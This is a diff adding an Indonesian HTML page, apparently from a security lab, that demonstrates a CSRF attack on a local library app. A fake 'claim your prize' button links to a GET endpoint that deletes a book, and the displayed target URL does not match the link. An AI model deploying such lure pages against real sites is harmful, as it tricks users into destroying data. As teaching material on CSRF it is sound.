@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Hadiah Spesial Perpustakaan!</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f1f5f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            max-width: 500px;
+            padding: 32px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border: 1px solid #e2e8f0;
+        }
+        .icon {
+            font-size: 50px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            color: #0f172a;
+            font-size: 1.5rem;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #64748b;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        .btn-claim {
+            display: inline-block;
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
+            color: #ffffff;
+            font-weight: 700;
+            text-decoration: none;
+            padding: 14px 28px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.35);
+            transition: all 0.2s ease;
+        }
+        .btn-claim:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(239, 68, 68, 0.45);
+        }
+        .exploit-note {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px dashed #cbd5e1;
+            font-size: 0.8rem;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+<body>
+    <!-- ========================================================================= -->
+    <!-- [CELAH A3] BERKAS JEBAKAN CSRF (jebakan.html)                              -->
+    <!-- Memanfaatkan metode HTTP GET pada endpoint penghapusan buku tanpa proteksi CSRF -->
+    <!-- ========================================================================= -->
+    <div class="card">
+        <div class="icon">🎁🎉</div>
+        <h1>Selamat! Anda Memenangkan Hadiah Spesial</h1>
+        <p>Anda terpilih mendapatkan voucher buku dan langganan perpustakaan premium gratis selama satu tahun penuh. Klik tombol klaim sekarang untuk mengaktifkan hadiah Anda!</p>
+
+        <!-- Tautan Jebakan CSRF yang memicu penghapusan buku via request GET tanpa CSRF token -->
+        <a href="http://localhost:8000/buku/5/hapus" class="btn-claim" id="trap-link">
+            KLIK DI SINI UNTUK KLAIM HADIAH
+        </a>
+
+        <div class="exploit-note">
+            Target URL: <code id="target-display">http://localhost:8000/buku/1/hapus</code>
+        </div>
+    </div>
+    <!-- ========================================================================= -->
+    <!-- AKHIR [CELAH A3]                                                          -->
+    <!-- ========================================================================= -->
+</body>
+</html>
